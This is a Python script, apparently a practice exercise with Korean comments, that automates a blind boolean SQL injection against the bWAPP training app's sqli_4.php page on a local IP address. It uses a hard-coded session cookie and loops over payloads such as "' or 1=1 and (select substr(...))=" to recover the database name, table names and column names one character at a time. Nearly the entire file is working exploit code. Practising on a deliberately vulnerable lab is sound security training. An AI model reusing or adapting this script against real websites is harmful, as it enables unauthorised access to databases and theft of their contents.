# login 개수 확인

# login 값에 대한 길이
# ' or 1=1 AND (select length()~~~~)

# login 값 추출하기
# ' or 1=1 AND (select substr(~~,n,1)) = A

# SELECT * FROM users;
# SELECT id FROM users;
# SELECT count(login) FROM users;
# SELECT length(login) FROM users;
# SELECT substr(login,1,1) FROM users;

import requests
#import urllib3

#urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
URL = 'http://192.168.0.30/bWAPP/sqli_4.php?title='
URL_POST = '&orderValue=search'
COOKIE = {'PHPSESSID':'48f7c8af9b6b55381197822b9096958a',
            'security_level':'0'}

def db():
    pre = "' or 1=1 and length(database())= "
    for db_len in range(1,30):
        Q = pre+str(db_len)+"%23"   #' or 1=1 and length(database())=db_len#
        r = requests.get(URL+Q+URL_POST,cookies=COOKIE, verify=False)
        #http://192.168.50.184/bWAPP/sqli_4.php?title=' or 1=1 and length(database())=1
        if "The movie exists in our database!" in r.text:
            print('DB LENGTH : '+str(db_len))
            break
        
    db_name=""
    for idx in range(1,db_len+1):
        pre = "' or 1=1 and (select substr(database(),"+str(idx)+",1)) ="
        for char in range(65,96):
            if(char == 92):
                continue
            Q = pre+"'"+chr(char)+"'%23"
            r = requests.get(URL+Q+URL_POST,cookies=COOKIE, verify=False)
            #http://192.168.50.184/bWAPP/sqli_4.php?title=' or 1=1 and (select substr(database(),"+str(idx)+",1))=A
            if "The movie exists in our database!" in r.text:
                db_name = db_name+chr(char)
                break
    print('DB NAME : '+db_name)

def table():
    pre = "' or 1=1 and (select count(table_name) from information_schema.tables where table_schema='BWAPP')="
    for tb_cnt in range(1,30):
        Q = pre+str(tb_cnt)+"%23"
        r = requests.get(URL+Q+URL_POST,cookies=COOKIE, verify=False)
        #print(URL+Q+URL_POST)
        if "The movie exists in our database!" in r.text:
            print('TABLE COUNT : '+str(tb_cnt))
            break
    
    for no in range(tb_cnt):
        pre = "' or 1=1 and (select length(table_name) from information_schema.tables where table_schema='BWAPP' limit "+str(no)+",1)="
        for tb_len in range(1,30):
            Q = pre+str(tb_len)+"%23"
            r = requests.get(URL+Q+URL_POST,cookies=COOKIE, verify=False)
            #print(URL+Q+URL_POST)
            if "The movie exists in our database!" in r.text:
                print('['+str(no)+'] TABLE LENGTH : '+str(tb_len))
                break

        tb_name=""
        for idx in range(1, tb_len+1):
            pre = "' or 1=1 and (select substr(table_name,"+str(idx)+",1) from information_schema.tables where table_schema='BWAPP' limit "+str(no)+",1)="
            for char in range(65,96):
                if(char == 92):
                    continue
                Q = pre+"'"+chr(char)+"'%23"
                r = requests.get(URL+Q+URL_POST,cookies=COOKIE, verify=False)
                #print(URL+Q+URL_POST)
                if "The movie exists in our database!" in r.text:
                    tb_name = tb_name+chr(char)
                    print('['+str(no)+'] TABLE NAME : '+tb_name)
                    break

def columns():
    for column_cnt in range(1,30):
        pre = "' or 1=1 and (select count(column_name) from information_schema.columns where table_name='users')="
        Q = pre+str(column_cnt)+"%23"
        r = requests.get(URL+Q+URL_POST,cookies=COOKIE, verify=False)
        if "The movie exists in our database!" in r.text:
            print('COLUMN COUNT : '+str(column_cnt))
            break
    

    for no in range(0,column_cnt):
        pre = "' or 1=1 and (select length(column_name) from information_schema.columns where table_name='users' limit "+str(no)+",1)="
        for column_len in range(1,30):
            Q = pre+str(column_len)+"%23"
            r = requests.get(URL+Q+URL_POST,cookies=COOKIE, verify=False)
            if "The movie exists in our database!" in r.text:
                print('[#'+str(no)+'] COLUMN LENGTH : '+str(column_len))
                break

        column_name=""
        for idx in range(1,column_len+1):
            pre = "' or 1=1 and (select substr(column_name,"+str(idx)+",1) from information_schema.columns where table_name='users' limit "+str(no)+",1)="
            for char in range(65,96):
                if(char == 92):
                    continue
                Q = pre+"'"+chr(char)+"'%23"
                r = requests.get(URL+Q+URL_POST,cookies=COOKIE, verify=False)
                if "The movie exists in our database!" in r.text:
                    column_name = column_name+chr(char)
                    break
        print('[#'+str(no)+'] COLUMN NAME : '+column_name)

#db()
table()
#columns()